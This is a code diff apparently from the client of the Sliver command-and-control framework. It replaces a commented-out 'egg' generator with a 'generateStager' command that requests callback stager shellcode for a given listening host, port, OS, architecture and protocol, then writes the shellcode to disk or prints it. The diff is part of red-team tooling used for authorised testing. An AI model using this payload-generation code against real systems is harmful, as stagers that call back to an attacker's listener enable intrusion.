@@ -155,103 +155,75 @@ func saveLocation(save, defaultName string) (string, error) {
 	return saveTo, nil
 }
 
-// func generateEgg(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
-// 	outFmt := ctx.Flags.String("output-format")
-// 	validFmt := false
-// 	for _, f := range validFormats {
-// 		if f == outFmt {
-// 			validFmt = true
-// 			break
-// 		}
-// 	}
-// 	if !validFmt {
-// 		fmt.Printf(Warn+"Invalid output format: %s", outFmt)
-// 		return
-// 	}
-// 	stagingURL := ctx.Flags.String("listener-url")
-// 	if stagingURL == "" {
-// 		return
-// 	}
-// 	save := ctx.Flags.String("save")
-// 	config := parseCompileFlags(ctx)
-// 	if config == nil {
-// 		return
-// 	}
-// 	config.Format = clientpb.SliverConfig_SHELLCODE
-// 	config.IsSharedLib = true
-// 	// Find job type (tcp / http)
-// 	u, err := url.Parse(stagingURL)
-// 	if err != nil {
-// 		fmt.Printf(Warn + "listener-url format not supported")
-// 		return
-// 	}
-// 	port, err := strconv.Atoi(u.Port())
-// 	if err != nil {
-// 		fmt.Printf(Warn+"Invalid port number: %s", err.Error())
-// 		return
-// 	}
-// 	eggConfig := &clientpb.EggConfig{
-// 		Host:   u.Hostname(),
-// 		Port:   uint32(port),
-// 		Arch:   config.GOARCH,
-// 		Format: outFmt,
-// 	}
-// 	switch u.Scheme {
-// 	case "tcp":
-// 		eggConfig.Protocol = clientpb.EggConfig_TCP
-// 	case "http":
-// 		eggConfig.Protocol = clientpb.EggConfig_HTTP
-// 	case "https":
-// 		eggConfig.Protocol = clientpb.EggConfig_HTTPS
-// 	default:
-// 		eggConfig.Protocol = clientpb.EggConfig_TCP
-// 	}
-// 	ctrl := make(chan bool)
-// 	go spin.Until("Creating stager shellcode...", ctrl)
-// 	data, _ := proto.Marshal(&clientpb.EggReq{
-// 		EConfig: eggConfig,
-// 		Config:  config,
-// 	})
-// 	resp := <-rpc(&sliverpb.Envelope{
-// 		Type: clientpb.MsgEggReq,
-// 		Data: data,
-// 	}, 45*time.Minute)
-// 	ctrl <- true
-// 	if resp.Err != "" {
-// 		fmt.Printf(Warn+"%s", resp.Err)
-// 		return
-// 	}
-// 	eggResp := &clientpb.Egg{}
-// 	err = proto.Unmarshal(resp.Data, eggResp)
-// 	if err != nil {
-// 		fmt.Printf(Warn+"Unmarshaling envelope error: %v\n", err)
-// 		return
-// 	}
-// 	// Don't display raw shellcode out stdout
-// 	if save != "" || outFmt == "raw" {
-// 		// Save it to disk
-// 		saveTo, _ := filepath.Abs(save)
-// 		fi, err := os.Stat(saveTo)
-// 		if err != nil {
-// 			fmt.Printf(Warn+"Failed to generate sliver egg %v\n", err)
-// 			return
-// 		}
-// 		if fi.IsDir() {
-// 			saveTo = filepath.Join(saveTo, eggResp.Filename)
-// 		}
-// 		err = ioutil.WriteFile(saveTo, eggResp.Data, 0700)
-// 		if err != nil {
-// 			fmt.Printf(Warn+"Failed to write to: %s\n", saveTo)
-// 			return
-// 		}
-// 		fmt.Printf(Info+"Sliver egg saved to: %s\n", saveTo)
-// 	} else {
-// 		// Display shellcode to stdout
-// 		fmt.Println("\n" + Info + "Here's your Egg:")
-// 		fmt.Println(string(eggResp.Data))
-// 	}
-// 	fmt.Printf("\n"+Info+"Successfully started job #%d\n", eggResp.JobID)
-// }
+func generateStager(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
+	var stageProto clientpb.StageProtocol
+	lhost := ctx.Flags.String("lhost")
+	if lhost == "" {
+		fmt.Println(Warn + "please specify a listening host")
+		return
+	}
+	lport := ctx.Flags.Int("lport")
+	stageOS := ctx.Flags.String("os")
+	arch := ctx.Flags.String("arch")
+	proto := ctx.Flags.String("protocol")
+	format := ctx.Flags.String("format")
+	badchars := ctx.Flags.String("badchars")
+	save := ctx.Flags.String("save")
+
+	bChars := make([]string, 0)
+	for _, b := range strings.Split(badchars, " ") {
+		bChars = append(bChars, fmt.Sprintf("\\x%s", b))
+	}
+
+	switch proto {
+	case "tcp":
+		stageProto = clientpb.StageProtocol_TCP
+	case "http":
+		stageProto = clientpb.StageProtocol_HTTP
+	case "https":
+		stageProto = clientpb.StageProtocol_HTTPS
+	default:
+		fmt.Printf(Warn+"%s staging protocol not supported\n", proto)
+		return
+	}
+
+	stageFile, err := rpc.MsfStage(context.Background(), &clientpb.MsfStagerReq{
+		Arch:     arch,
+		BadChars: bChars,
+		Format:   format,
+		Host:     lhost,
+		Port:     uint32(lport),
+		Protocol: stageProto,
+		OS:       stageOS,
+	})
+
+	if err != nil {
+		fmt.Printf(Warn+"Error: %v", err)
+		return
+	}
+
+	if save != "" || format == "raw" {
+		saveTo, _ := filepath.Abs(save)
+		fi, err := os.Stat(saveTo)
+		if err != nil {
+			fmt.Printf(Warn+"Failed to generate sliver egg %v\n", err)
+			return
+		}
+		if fi.IsDir() {
+			saveTo = filepath.Join(saveTo, stageFile.GetFile().GetName())
+		}
+		err = ioutil.WriteFile(saveTo, stageFile.GetFile().GetData(), os.ModePerm)
+		if err != nil {
+			fmt.Printf(Warn+"Failed to write to: %s\n", saveTo)
+			return
+		}
+		fmt.Printf(Info+"Sliver egg saved to: %s\n", saveTo)
+	} else {
+		fmt.Println(Info + "Here's your stager:")
+		fmt.Println(string(stageFile.GetFile().GetData()))
+	}
+
+}
 
 // Shared function that extracts the compile flags from the grumble context
 func parseCompileFlags(ctx *grumble.Context) *clientpb.ImplantConfig {
